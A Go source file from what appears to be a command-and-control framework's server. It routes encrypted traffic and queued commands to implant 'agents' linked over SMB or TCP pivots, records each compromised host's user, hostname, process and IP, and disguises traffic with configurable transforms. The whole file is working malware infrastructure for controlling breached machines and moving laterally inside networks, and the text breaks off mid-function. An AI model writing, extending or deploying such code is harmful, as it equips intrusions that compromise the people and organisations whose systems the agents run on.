// internal/agent/listeners/handler_link.go
package listeners

import (
	"c2/internal/common/config"
	"c2/internal/common/transforms"
	pb "c2/proto"
	"context"
	"crypto"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"
)

// LinkRouting manages the routing table for linked agents
type LinkRouting struct {
	mu                        sync.RWMutex
	db                        *sql.DB
	config                    *config.SMBLinkConfig
	pendingHandshakeResponses map[string][]*LinkCommandItem // edgeClientID -> pending responses
}

// LinkDataItem represents a single linked agent's data in a POST request
type LinkDataItem struct {
	RoutingID string `json:"r"`  // Short routing ID
	Payload   string `json:"p"`  // Base64 encoded, encrypted with linked agent's secret
}

// LinkHandshakeItem represents a handshake from a newly linked agent
type LinkHandshakeItem struct {
	RoutingID string `json:"r"`  // Short routing ID assigned by edge agent
	Payload   string `json:"p"`  // RSA+AES encrypted handshake blob
}

// LinkCommandItem represents a command destined for a linked agent
type LinkCommandItem struct {
	RoutingID     string `json:"r"`             // Short routing ID
	Payload       string `json:"p"`             // Encrypted command payload (or transformed blob)
	PrependLength int    `json:"pre,omitempty"` // Length of random prepend (for transform reversal)
	AppendLength  int    `json:"app,omitempty"` // Length of random append (for transform reversal)
	Transformed   bool   `json:"t,omitempty"`   // True if transforms are applied (even if no padding)
}

// NewLinkRouting creates a new link routing manager
func NewLinkRouting(db *sql.DB) (*LinkRouting, error) {
	cfg, err := config.GetSMBLinkConfig()
	if err != nil {
		// Use defaults if config not available
		cfg = &config.SMBLinkConfig{
			ConnectionTimeout: 30,
			MaxMessageSize:    1048576,
			HeartbeatInterval: 60,
			Malleable: config.SMBLinkMalleable{
				LinkDataField:              "ld",
				LinkCommandsField:          "lc",
				LinkHandshakeField:         "lh",
				LinkHandshakeResponseField: "lr",
				RoutingIDField:             "r",
				PayloadField:               "p",
			},
		}
	}

	return &LinkRouting{
		db:                        db,
		config:                    cfg,
		pendingHandshakeResponses: make(map[string][]*LinkCommandItem),
	}, nil
}

// RegisterLink registers a new link routing entry
// Supports both SMB and TCP links - populates the appropriate profile/xorKey columns based on linkType
func (lr *LinkRouting) RegisterLink(edgeClientID, routingID, linkedClientID, linkType, profile, xorKey string) error {
	lr.mu.Lock()
	defer lr.mu.Unlock()

	// Populate the appropriate columns based on link type
	var smbProfile, smbXorKey, tcpProfile, tcpXorKey interface{}
	if linkType == "tcp" {
		tcpProfile = profile
		tcpXorKey = xorKey
		smbProfile = nil
		smbXorKey = nil
	} else {
		smbProfile = profile
		smbXorKey = xorKey
		tcpProfile = nil
		tcpXorKey = nil
	}

	_, err := lr.db.Exec(`
		INSERT INTO link_routing (edge_clientID, routing_id, linked_clientID, link_type, smb_profile, smb_xor_key, tcp_profile, tcp_xor_key, created_at, last_seen, status)
		VALUES ($1, $2, $3, $4, $5, $6, $7, $8, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 'active')
		ON CONFLICT (edge_clientID, routing_id)
		DO UPDATE SET linked_clientID = $3, link_type = $4, smb_profile = $5, smb_xor_key = $6, tcp_profile = $7, tcp_xor_key = $8, last_seen = CURRENT_TIMESTAMP, status = 'active'`,
		edgeClientID, routingID, linkedClientID, linkType, smbProfile, smbXorKey, tcpProfile, tcpXorKey)

	if err != nil {
		return fmt.Errorf("failed to register link: %w", err)
	}

	return nil
}

// ResolveRoutingID looks up the real clientID for a routing ID
func (lr *LinkRouting) ResolveRoutingID(edgeClientID, routingID string) (string, error) {
	lr.mu.RLock()
	defer lr.mu.RUnlock()

	var linkedClientID string
	err := lr.db.QueryRow(`
		SELECT linked_clientID FROM link_routing
		WHERE edge_clientID = $1 AND routing_id = $2 AND status = 'active'`,
		edgeClientID, routingID).Scan(&linkedClientID)

	if err != nil {
		if err == sql.ErrNoRows {
			return "", fmt.Errorf("no link found for edge=%s, routing=%s", edgeClientID, routingID)
		}
		return "", fmt.Errorf("failed to resolve routing ID: %w", err)
	}

	return linkedClientID, nil
}

// UpdateLastSeen updates the last_seen timestamp for a link
func (lr *LinkRouting) UpdateLastSeen(edgeClientID, routingID string) error {
	_, err := lr.db.Exec(`
		UPDATE link_routing SET last_seen = CURRENT_TIMESTAMP
		WHERE edge_clientID = $1 AND routing_id = $2`,
		edgeClientID, routingID)
	return err
}

// DisconnectLink marks a link as disconnected and clears the parent relationship
func (lr *LinkRouting) DisconnectLink(edgeClientID, routingID string) (string, error) {
	lr.mu.Lock()
	defer lr.mu.Unlock()

	// First, get the linked_clientID so we can clear its parent relationship
	var linkedClientID string
	err := lr.db.QueryRow(`
		SELECT linked_clientID FROM link_routing
		WHERE edge_clientID = $1 AND routing_id = $2`,
		edgeClientID, routingID).Scan(&linkedClientID)

	if err != nil {
		return "", fmt.Errorf("failed to find link for disconnect: %w", err)
	}

	// Mark the link as disconnected
	_, err = lr.db.Exec(`
		UPDATE link_routing SET status = 'disconnected'
		WHERE edge_clientID = $1 AND routing_id = $2`,
		edgeClientID, routingID)

	if err != nil {
		return linkedClientID, fmt.Errorf("failed to disconnect link: %w", err)
	}

	// Clear the parent relationship in the connections table
	_, err = lr.db.Exec(`
		UPDATE connections SET parent_clientID = NULL, link_type = NULL
		WHERE newclientID = $1`,
		linkedClientID)

	return linkedClientID, err
}

// StorePendingHandshakeResponse stores a handshake response to be sent to an edge agent
func (lr *LinkRouting) StorePendingHandshakeResponse(edgeClientID string, response *LinkCommandItem) {
	lr.mu.Lock()
	defer lr.mu.Unlock()
	lr.pendingHandshakeResponses[edgeClientID] = append(lr.pendingHandshakeResponses[edgeClientID], response)
}

// GetPendingHandshakeResponses retrieves and clears pending handshake responses for an edge agent
func (lr *LinkRouting) GetPendingHandshakeResponses(edgeClientID string) []*LinkCommandItem {
	lr.mu.Lock()
	defer lr.mu.Unlock()
	responses := lr.pendingHandshakeResponses[edgeClientID]
	delete(lr.pendingHandshakeResponses, edgeClientID)
	return responses
}

// PeekPendingHandshakeResponses returns pending handshake responses WITHOUT clearing them
// Used to check if we should hold back commands until handshake is delivered
func (lr *LinkRouting) PeekPendingHandshakeResponses(edgeClientID string) []*LinkCommandItem {
	lr.mu.RLock()
	defer lr.mu.RUnlock()
	return lr.pendingHandshakeResponses[edgeClientID]
}

// GetLinkedAgents returns all active linked agents for an edge agent
func (lr *LinkRouting) GetLinkedAgents(edgeClientID string) ([]string, error) {
	lr.mu.RLock()
	defer lr.mu.RUnlock()

	rows, err := lr.db.Query(`
		SELECT linked_clientID FROM link_routing
		WHERE edge_clientID = $1 AND status = 'active'`,
		edgeClientID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var agents []string
	for rows.Next() {
		var clientID string
		if err := rows.Scan(&clientID); err != nil {
			continue
		}
		agents = append(agents, clientID)
	}

	return agents, nil
}

// processLinkData handles link data from an edge agent's POST
// This is called from handler_active.go after decrypting the edge agent's payload
func (m *Manager) processLinkData(ctx context.Context, tx *sql.Tx, edgeClientID string, linkData []interface{}) error {
	if m.linkRouting == nil {
		var err error
		m.linkRouting, err = NewLinkRouting(m.db)
		if err != nil {
			return fmt.Errorf("failed to initialize link routing: %w", err)
		}
	}

	cfg := m.linkRouting.config.GetMalleable()

	for _, item := range linkData {
		itemMap, ok := item.(map[string]interface{})
		if !ok {
			continue
		}

		routingID, _ := itemMap[cfg.RoutingIDField].(string)
		payload, _ := itemMap[cfg.PayloadField].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Try to resolve the routing ID to the real clientID
		// If it fails, this might be a new handshake from an unregistered SMB agent
		linkedClientID, err := m.linkRouting.ResolveRoutingID(edgeClientID, routingID)
		if err != nil {
			// Unknown routing ID - this is likely a new handshake
			response, err := m.processLinkHandshake(ctx, edgeClientID, itemMap)
			if err != nil {
				log.Printf("[LinkData] Failed to process handshake: %v", err)
				continue
			}

			if response != nil {
				m.storeLinkHandshakeResponse(edgeClientID, response)
			}
			continue
		}

		// Get the linked agent's connection info
		linkedConn, err := m.activeConnections.GetConnection(linkedClientID)
		if err != nil {
			log.Printf("[LinkData] No active connection for linked agent %s: %v", linkedClientID, err)
			continue
		}

		// Get profile and XOR key for this agent to determine if transforms were applied
		linkProfile := m.getProfileForAgent(linkedClientID)
		linkXorKey := m.getXorKeyForAgent(linkedClientID)

		// Extract padding lengths if present (for transform reversal)
		prependLen := 0
		appendLen := 0
		if pre, ok := itemMap["pre"].(float64); ok {
			prependLen = int(pre)
		}
		if app, ok := itemMap["app"].(float64); ok {
			appendLen = int(app)
		}

		// Decode base64 payload
		rawPayload, err := base64.StdEncoding.DecodeString(payload)
		if err != nil {
			log.Printf("[LinkData] Failed to decode base64 payload: %v", err)
			continue
		}

		// Reverse transforms if profile has transforms
		var encryptedPayload string
		if linkProfile != nil && linkProfile.Data != nil && len(linkProfile.Data.Transforms) > 0 {
			encryptedPayload, err = reversePipeTransforms(rawPayload, linkProfile, prependLen, appendLen, linkXorKey)
			if err != nil {
				log.Printf("[LinkData] Failed to reverse transforms for %s: %v", linkedClientID, err)
				continue
			}
		} else {
			// Legacy mode - no transforms, parse JSON envelope directly
			var envelope struct {
				Type    string `json:"type"`
				Payload string `json:"payload"`
			}
			if err := json.Unmarshal(rawPayload, &envelope); err != nil {
				encryptedPayload = payload
			} else {
				encryptedPayload = envelope.Payload
			}
		}

		// Decrypt the payload with the linked agent's secret
		decryptedPayload, err := decryptLinkedPayload(encryptedPayload, linkedConn.Secret1)
		if err != nil {
			log.Printf("[LinkData] Failed to decrypt linked payload for %s: %v", linkedClientID, err)
			continue
		}

		// Parse the decrypted payload - now includes potential nested link data
		var linkedData struct {
			AgentID             string                   `json:"agent_id"`
			Results             []map[string]interface{} `json:"results"`
			NestedLinkData      []interface{}            `json:"ld"` // Link data from grandchild agents
			NestedLinkHandshake map[string]interface{}   `json:"lh"` // Handshake from newly linked grandchild agent
			UnlinkNotifications []interface{}            `json:"lu"` // Unlink notifications from children
		}
		if err := json.Unmarshal(decryptedPayload, &linkedData); err != nil {
			log.Printf("[LinkData] Failed to parse linked payload: %v", err)
			continue
		}

		// Process the linked agent's results
		if err := m.processResults(ctx, tx, linkedClientID, linkedData.Results); err != nil {
			log.Printf("[LinkData] Failed to process linked results for %s: %v", linkedClientID, err)
			continue
		}

		// RECURSIVE: Process nested link data from grandchild agents
		if len(linkedData.NestedLinkData) > 0 {
			if err := m.processLinkData(ctx, tx, linkedClientID, linkedData.NestedLinkData); err != nil {
				log.Printf("[LinkData] Failed to process nested link data: %v", err)
			}
		}

		// Process nested link handshake from grandchild agent
		if linkedData.NestedLinkHandshake != nil && len(linkedData.NestedLinkHandshake) > 0 {
			response, err := m.processLinkHandshake(ctx, linkedClientID, linkedData.NestedLinkHandshake)
			if err != nil {
				log.Printf("[LinkData] Nested link handshake failed: %v", err)
			} else if response != nil {
				m.storeLinkHandshakeResponse(linkedClientID, response)
			}
		}

		// Process unlink notifications from child agents
		if len(linkedData.UnlinkNotifications) > 0 {
			m.processUnlinkNotifications(ctx, linkedClientID, linkedData.UnlinkNotifications)
		}

		// Rotate the linked agent's secrets
		if err := m.rotateLinkedSecrets(linkedConn); err != nil {
			log.Printf("[LinkData] Failed to rotate secrets: %v", err)
		}

		// Update last seen
		m.linkRouting.UpdateLastSeen(edgeClientID, routingID)
		tx.ExecContext(ctx, `UPDATE connections SET lastSEEN = CURRENT_TIMESTAMP WHERE newclientID = $1`, linkedClientID)

		// Broadcast last seen update to websocket clients
		if m.commandBuffer != nil {
			m.commandBuffer.BroadcastLastSeen(linkedClientID, time.Now().Unix())
		}
	}

	return nil
}

// processUnlinkNotifications handles unlink notifications from an edge agent
// When the edge agent disconnects from an SMB agent, it sends a notification
// so we can clear the parent relationship and notify clients
func (m *Manager) processUnlinkNotifications(ctx context.Context, edgeClientID string, unlinkData []interface{}) {
	if m.linkRouting == nil {
		var err error
		m.linkRouting, err = NewLinkRouting(m.db)
		if err != nil {
			return
		}
	}

	for _, item := range unlinkData {
		routingID, ok := item.(string)
		if !ok {
			continue
		}

		linkedClientID, err := m.linkRouting.DisconnectLink(edgeClientID, routingID)
		if err != nil {
			continue
		}

		// Broadcast the unlink event to websocket clients
		if m.commandBuffer != nil {
			m.commandBuffer.BroadcastLinkUpdate(linkedClientID, "", "")
		}
	}
}

// processLinkHandshake handles a new link handshake from an SMB or TCP agent
func (m *Manager) processLinkHandshake(ctx context.Context, edgeClientID string, handshake map[string]interface{}) (*LinkCommandItem, error) {
	if m.linkRouting == nil {
		var err error
		m.linkRouting, err = NewLinkRouting(m.db)
		if err != nil {
			return nil, fmt.Errorf("failed to initialize link routing: %w", err)
		}
	}

	cfg := m.linkRouting.config.GetMalleable()

	routingID, _ := handshake[cfg.RoutingIDField].(string)
	payload, _ := handshake[cfg.PayloadField].(string)

	if routingID == "" || payload == "" {
		return nil, fmt.Errorf("missing routing_id or payload in handshake")
	}

	// The payload is RSA+AES encrypted just like a normal handshake
	// We need to find the init data by trying to decrypt with known init secrets
	// This is done by extracting the clientID from the metadata

	// Decode the base64 payload
	payloadBytes, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to decode handshake payload: %w", err)
	}

	// Parse the outer envelope to get the encrypted_key and encrypted_data
	var envelope struct {
		EncryptedKey  string `json:"encrypted_key"`
		EncryptedData string `json:"encrypted_data"`
	}
	if err := json.Unmarshal(payloadBytes, &envelope); err != nil {
		return nil, fmt.Errorf("failed to parse handshake envelope: %w", err)
	}

	// Try to find matching init data and decrypt
	// We need to iterate through init data to find the matching one
	var matchedInit *InitData
	var decryptedSysInfo []byte

	for _, initData := range m.initData {
		// Reconstruct the JSON for DecryptDoubleEncrypted
		envelopeJSON, _ := json.Marshal(envelope)
		decrypted, err := DecryptDoubleEncrypted(
			string(envelopeJSON),
			initData.RSAKey,
			initData.Secret,
		)
		if err != nil {
			continue // Try next init data
		}

		// Successfully decrypted - this is our agent
		matchedInit = initData
		decryptedSysInfo = []byte(decrypted)
		break
	}

	if matchedInit == nil {
		return nil, fmt.Errorf("no matching init data found for handshake")
	}

	// Determine link type from init data - supports both SMB and TCP
	// Note: matchedInit.Type is "link" for all link payloads
	// matchedInit.Protocol contains the actual protocol: "SMB" or "TCP"
	protocolUpper := strings.ToUpper(matchedInit.Protocol) // "SMB" or "TCP"
	if protocolUpper == "" {
		protocolUpper = "SMB" // Default to SMB for backwards compatibility
	}
	linkType := strings.ToLower(protocolUpper) // "smb" or "tcp"

	// Parse the system info
	var sysInfo SystemInfo
	if err := json.Unmarshal(decryptedSysInfo, &sysInfo); err != nil {
		return nil, fmt.Errorf("failed to parse system info: %w", err)
	}

	// Generate secrets from the seed (same as normal handshake)
	secret1, secret2 := generateInitialSecrets(matchedInit.Secret, sysInfo.AgentInfo.Seed)

	// Get external IP from edge agent's connection (linked agents don't have direct external IP)
	edgeConn, _ := m.activeConnections.GetConnection(edgeClientID)
	extIP := ""
	if edgeConn != nil {
		// We'll mark it as coming through the edge
		extIP = fmt.Sprintf("via:%s", edgeClientID[:8])
	}

	// Check if this linked agent already exists (reconnection scenario)
	// Match by clientID (init ID), protocol (SMB/TCP), hostname, and process name
	var existingClientID string
	err = m.db.QueryRowContext(ctx, `
		SELECT newclientID FROM connections
		WHERE clientID = $1 AND protocol = $2
		AND hostname = $3 AND process = $4
		AND deleted_at IS NULL
		LIMIT 1`,
		matchedInit.ClientID,
		protocolUpper,
		sysInfo.AgentInfo.Hostname,
		sysInfo.AgentInfo.ProcessName,
	).Scan(&existingClientID)

	var newClientID string
	var isReconnect bool

	if err == nil && existingClientID != "" {
		// Existing linked agent found - update it instead of creating new
		isReconnect = true
		newClientID = existingClientID

		// Update the existing connection with new secrets, parent, and link_type
		_, err = m.db.ExecContext(ctx, `
			UPDATE connections SET
				secret1 = $1, secret2 = $2,
				extIP = $3, parent_clientID = $4,
				lastSEEN = CURRENT_TIMESTAMP,
				pid = $5, link_type = $6
			WHERE newclientID = $7`,
			secret1, secret2,
			extIP, edgeClientID,
			fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
			linkType, // Ensure link_type is set/updated on reconnect
			newClientID,
		)
		if err != nil {
			return nil, fmt.Errorf("failed to update linked connection: %w", err)
		}

		// Update active connections with new secrets (must use UpdateConnection for existing connections)
		if err := m.activeConnections.UpdateConnection(&ActiveConnection{
			ClientID: newClientID,
			Protocol: protocolUpper,
			Secret1:  secret1,
			Secret2:  secret2,
		}); err != nil {
			log.Printf("[WARN] Failed to update active connection for reconnecting agent %s: %v", newClientID, err)
		}
	} else {
		// New linked agent - create new entry
		isReconnect = false
		newClientID = generateNewClientID()

		// Store the connection with parent reference
		_, err = m.db.ExecContext(ctx, `
			INSERT INTO connections (
				newclientID, clientID, protocol, secret1, secret2,
				extIP, intIP, username, hostname, note,
				process, pid, arch, lastSEEN, os, proto,
				parent_clientID, link_type, hop_count
			) VALUES (
				$1, $2, $3, $4, $5,
				$6, $7, $8, $9, $10,
				$11, $12, $13, CURRENT_TIMESTAMP, $14, $15,
				$16, $17, $18
			)`,
			newClientID,
			matchedInit.ClientID,
			protocolUpper, // Dynamic: "SMB" or "TCP"
			secret1,
			secret2,
			extIP,
			sysInfo.AgentInfo.InternalIP,
			sysInfo.AgentInfo.Username,
			sysInfo.AgentInfo.Hostname,
			"",
			sysInfo.AgentInfo.ProcessName,
			fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
			sysInfo.AgentInfo.Arch,
			sysInfo.AgentInfo.OS,
			protocolUpper, // Dynamic: "SMB" or "TCP"
			edgeClientID,
			linkType, // Dynamic: "smb" or "tcp"
			1,        // hop_count = 1 for direct link
		)
		if err != nil {
			return nil, fmt.Errorf("failed to store linked connection: %w", err)
		}

		// Add to active connections
		if err := m.activeConnections.AddConnection(&ActiveConnection{
			ClientID: newClientID,
			Protocol: protocolUpper,
			Secret1:  secret1,
			Secret2:  secret2,
		}); err != nil {
			log.Printf("[WARN] Failed to add active connection for new linked agent %s: %v", newClientID, err)
		}
	}

	// Register the link routing with profile and XOR key from init data
	// Use appropriate profile/key based on link type (SMB or TCP)
	profile := ""
	xorKey := ""
	if matchedInit != nil {
		if linkType == "tcp" {
			profile = matchedInit.TCPProfile
			xorKey = matchedInit.TCPXorKey
		} else {
			profile = matchedInit.SMBProfile
			xorKey = matchedInit.SMBXorKey
		}
	}
	if err := m.linkRouting.RegisterLink(edgeClientID, routingID, newClientID, linkType, profile, xorKey); err != nil {
		return nil, fmt.Errorf("failed to register link: %w", err)
	}

	if isReconnect {
		// Broadcast link_update for reconnection (re-parenting existing agent)
		m.commandBuffer.BroadcastLinkUpdate(newClientID, edgeClientID, linkType)
		log.Printf("[LINK] %s agent %s re-linked to %s", protocolUpper, newClientID[:8], edgeClientID[:8])
	} else {
		// Notify websocket service about the new linked agent
		notification := &pb.ConnectionNotification{
			NewClientId:    newClientID,
			ClientId:       matchedInit.ClientID,
			Protocol:       protocolUpper, // Dynamic: "SMB" or "TCP"
			Secret1:        secret1,
			Secret2:        secret2,
			ExtIp:          extIP,
			IntIp:          sysInfo.AgentInfo.InternalIP,
			Username:       sysInfo.AgentInfo.Username,
			Hostname:       sysInfo.AgentInfo.Hostname,
			Process:        sysInfo.AgentInfo.ProcessName,
			Pid:            fmt.Sprintf("%d", sysInfo.AgentInfo.PID),
			Arch:           sysInfo.AgentInfo.Arch,
			Os:             sysInfo.AgentInfo.OS,
			Proto:          protocolUpper, // Dynamic: "SMB" or "TCP"
			LastSeen:       time.Now().Unix(),
			ParentClientId: edgeClientID, // Link parent info for UI hierarchy
			LinkType:       linkType,     // Dynamic: "smb" or "tcp"
		}

		m.notifyWebsocketService(notification)
		log.Printf("[LINK] New %s agent %s connected via %s", protocolUpper, newClientID[:8], edgeClientID[:8])
	}

	// Create signed response (same as normal handshake)
	signature, err := signHandshakeResponse(newClientID, sysInfo.AgentInfo.Seed, matchedInit.RSAKey)
	if err != nil {
		return nil, fmt.Errorf("failed to sign response: %w", err)
	}

	// Build response for the SMB agent
	response := SignedResponse{
		Status:             "success",
		NewClientID:        newClientID,
		SecretsInitialized: true,
		Signature:          signature,
		Seed:               sysInfo.AgentInfo.Seed,
	}

	responseJSON, err := json.Marshal(response)
	if err != nil {
		return nil, fmt.Errorf("failed to marshal response: %w", err)
	}

	// The response needs to be sent back through the edge agent
	// It's NOT encrypted here - the edge agent will wrap it
	return &LinkCommandItem{
		RoutingID: routingID,
		Payload:   base64.StdEncoding.EncodeToString(responseJSON),
	}, nil
}

// getCommandsForLinkedAgents retrieves pending commands for all linked agents
// For multi-hop chains, this also recursively gets commands for grandchildren
// and wraps them properly for forwarding through the chain
func (m *Manager) getCommandsForLinkedAgents(edgeClientID string) ([]LinkCommandItem, error) {
	if m.linkRouting == nil {
		log.Printf("[LinkCommands] linkRouting is nil for edge %s", edgeClientID[:8])
		return nil, nil
	}

	linkedAgents, err := m.linkRouting.GetLinkedAgents(edgeClientID)
	if err != nil {
		log.Printf("[LinkCommands] Error getting linked agents for edge %s: %v", edgeClientID[:8], err)
		return nil, err
	}

	if len(linkedAgents) == 0 {
		return nil, nil
	}

	log.Printf("[LinkCommands] Found %d linked agents for edge %s", len(linkedAgents), edgeClientID[:8])

	var commands []LinkCommandItem
	cfg := m.linkRouting.config.GetMalleable()
	_ = cfg // Will use for field names if needed

	// Check if there are any pending handshake responses for this edge agent
	// If so, we should NOT send commands yet - the SMB agent hasn't completed handshake
	pendingHandshakes := m.linkRouting.PeekPendingHandshakeResponses(edgeClientID)
	pendingRoutingIDs := make(map[string]bool)
	for _, h := range pendingHandshakes {
		if h != nil {
			pendingRoutingIDs[h.RoutingID] = true
		}
	}

	for _, linkedClientID := range linkedAgents {
		// Get routing ID for this linked agent
		var routingID string
		err := m.db.QueryRow(`
			SELECT routing_id FROM link_routing
			WHERE edge_clientID = $1 AND linked_clientID = $2 AND status = 'active'`,
			edgeClientID, linkedClientID).Scan(&routingID)
		if err != nil {
			log.Printf("[LinkCommands] No routing ID found for linked agent %s: %v", linkedClientID[:8], err)
			continue
		}

		log.Printf("[LinkCommands] Processing linked agent %s with routing ID %s", linkedClientID[:8], routingID)

		// Skip if this routing ID has a pending handshake response
		if pendingRoutingIDs[routingID] {
			log.Printf("[LinkCommands] Skipping %s - pending handshake response", linkedClientID[:8])
			continue
		}

		// Get pending commands for this linked agent
		pendingCmds, hasCommands := m.commandBuffer.GetCommand(linkedClientID)
		log.Printf("[LinkCommands] Agent %s: hasCommands=%v, cmdCount=%d", linkedClientID[:8], hasCommands, len(pendingCmds))

		// MULTI-HOP: Also get commands and handshake responses for this agent's children
		// These need to be nested in the payload so the linked agent can forward them
		nestedHandshakes, nestedCommands, _ := m.getPendingLinkResponsesSeparate(linkedClientID)

		// If no commands and no nested data, skip
		if (!hasCommands || len(pendingCmds) == 0) && len(nestedHandshakes) == 0 && len(nestedCommands) == 0 {
			log.Printf("[LinkCommands] Skipping %s - no commands or nested data", linkedClientID[:8])
			continue
		}

		// Get the linked agent's connection for encryption
		linkedConn, err := m.activeConnections.GetConnection(linkedClientID)
		if err != nil {
			continue
		}

		// Build the payload - can include commands and/or nested link data
		var payload map[string]interface{}

		if hasCommands && len(pendingCmds) > 0 {
			var cmds []interface{}
			if err := json.Unmarshal([]byte(pendingCmds[0]), &cmds); err == nil {
				payload = map[string]interface{}{
					"commands": cmds,
				}
			}
		}

		// Add nested handshake responses (for grandchildren)
		if len(nestedHandshakes) > 0 {
			if payload == nil {
				payload = make(map[string]interface{})
			}
			payload["lr"] = nestedHandshakes
		}

		// Add nested commands (for grandchildren)
		if len(nestedCommands) > 0 {
			if payload == nil {
				payload = make(map[string]interface{})
			}
			payload["lc"] = nestedCommands
		}

		// Skip if nothing to send
		if payload == nil {
			continue
		}

		// Marshal the combined payload
		cmdJSON, err := json.Marshal(payload)
		if err != nil {
			continue
		}

		encryptedPayload, err := encryptForLinkedAgent(cmdJSON, linkedConn.Secret1)
		if err != nil {
			continue
		}

		// Get profile and XOR key for this linked agent (auto-detects SMB vs TCP)
		linkProfile := m.getProfileForAgent(linkedClientID)
		linkXorKey := m.getXorKeyForAgent(linkedClientID)

		// Check if we should use transforms or legacy mode
		if linkProfile == nil || linkProfile.Data == nil || len(linkProfile.Data.Transforms) == 0 {
			// Legacy mode - just send the encrypted payload
			commands = append(commands, LinkCommandItem{
				RoutingID:   routingID,
				Payload:     encryptedPayload,
				Transformed: false,
			})
		} else {
			// Transforms mode - wrap in JSON envelope and apply transforms
			transformedData, prependLen, appendLen, err := applyPipeTransforms(encryptedPayload, linkProfile, linkXorKey)
			if err != nil {
				// Fall back to legacy mode
				commands = append(commands, LinkCommandItem{
					RoutingID:   routingID,
					Payload:     encryptedPayload,
					Transformed: false,
				})
				continue
			}

			commands = append(commands, LinkCommandItem{
				RoutingID:     routingID,
				Payload:       base64.StdEncoding.EncodeToString(transformedData),
				PrependLength: prependLen,
				AppendLength:  appendLen,
				Transformed:   true,
			})
		}
	}

	return commands, nil
}

// Helper functions

func decryptLinkedPayload(payload string, secret string) ([]byte, error) {
	// Decode base64
	ciphertext, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		return nil, fmt.Errorf("failed to decode base64: %w", err)
	}

	// Derive key from secret
	key := sha256.Sum256([]byte(secret))

	// Create cipher
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %w", err)
	}

	nonceSize := aesGCM.NonceSize()
	if len(ciphertext) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce := ciphertext[:nonceSize]
	ciphertext = ciphertext[nonceSize:]

	plaintext, err := aesGCM.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt: %w", err)
	}

	return plaintext, nil
}

func encryptForLinkedAgent(data []byte, secret string) (string, error) {
	// Derive key from secret
	key := sha256.Sum256([]byte(secret))

	// Create cipher
	block, err := aes.NewCipher(key[:])
	if err != nil {
		return "", fmt.Errorf("failed to create cipher: %w", err)
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("failed to create GCM: %w", err)
	}

	// Generate cryptographically secure nonce
	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return "", fmt.Errorf("failed to generate nonce: %w", err)
	}

	// Encrypt
	ciphertext := aesGCM.Seal(nonce, nonce, data, nil)

	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func (m *Manager) rotateLinkedSecrets(conn *ActiveConnection) error {
	// Same rotation as regular agents
	newSecret := rotateSecret(conn.Secret1, conn.Secret2)
	conn.Secret2 = conn.Secret1
	conn.Secret1 = newSecret

	// Update in database
	_, err := m.db.Exec(`
		UPDATE connections
		SET secret1 = $1, secret2 = $2, lastSEEN = CURRENT_TIMESTAMP
		WHERE newclientID = $3`,
		conn.Secret1, conn.Secret2, conn.ClientID)

	return err
}

func generateNewClientID() string {
	// Generate UUID - simplified version
	b := make([]byte, 16)
	for i := range b {
		b[i] = byte(time.Now().UnixNano() >> (i * 4))
	}
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func signHandshakeResponse(newClientID, seed, rsaKeyPEM string) (string, error) {
	// This should use the same signing logic as handler_handshake.go
	// For now, returning placeholder - will integrate with existing code
	verificationData := fmt.Sprintf("%s:%s", newClientID, seed)
	hashed := sha256.Sum256([]byte(verificationData))

	// Sign with RSA private key
	signature, err := signWithRSAKey(hashed[:], rsaKeyPEM)
	if err != nil {
		return "", err
	}

	return base64.StdEncoding.EncodeToString(signature), nil
}

func rotateSecret(secret1, secret2 string) string {
	// HMAC-based rotation - must match agent side exactly
	// newSecret = HMAC(secret2 as key, secret1 as data)
	h := hmac.New(sha256.New, []byte(secret2))
	h.Write([]byte(secret1))
	return fmt.Sprintf("%x", h.Sum(nil))
}

// storeLinkHandshakeResponse stores a pending handshake response for an edge agent
func (m *Manager) storeLinkHandshakeResponse(edgeClientID string, response *LinkCommandItem) {
	if m.linkRouting == nil {
		var err error
		m.linkRouting, err = NewLinkRouting(m.db)
		if err != nil {
			return
		}
	}
	m.linkRouting.StorePendingHandshakeResponse(edgeClientID, response)
}

// getPendingLinkResponses retrieves all pending link responses for an edge agent
// This includes handshake responses and commands for linked agents
// DEPRECATED: Use getPendingLinkResponsesSeparate instead for proper separation
func (m *Manager) getPendingLinkResponses(edgeClientID string) ([]LinkCommandItem, error) {
	handshakes, commands, err := m.getPendingLinkResponsesSeparate(edgeClientID)
	if err != nil {
		return nil, err
	}
	// Combine for backwards compatibility
	var all []LinkCommandItem
	all = append(all, handshakes...)
	all = append(all, commands...)
	return all, nil
}

// getPendingLinkResponsesSeparate retrieves pending handshake responses and commands separately
// This allows the server to send them in different fields (lr for handshakes, lc for commands)
// so the HTTPS agent can forward them with the correct message type
func (m *Manager) getPendingLinkResponsesSeparate(edgeClientID string) (handshakes []LinkCommandItem, commands []LinkCommandItem, err error) {
	if m.linkRouting == nil {
		return nil, nil, nil
	}

	// Get pending handshake responses
	handshakeResponses := m.linkRouting.GetPendingHandshakeResponses(edgeClientID)
	for _, r := range handshakeResponses {
		if r != nil {
			handshakes = append(handshakes, *r)
		}
	}

	// Get commands for linked agents
	commands, _ = m.getCommandsForLinkedAgents(edgeClientID)

	return handshakes, commands, nil
}

// signWithRSAKey signs data with an RSA private key
// The RSA key is stored base64-encoded in the database, and the decoded content is PEM format
func signWithRSAKey(data []byte, rsaKeyBase64 string) ([]byte, error) {
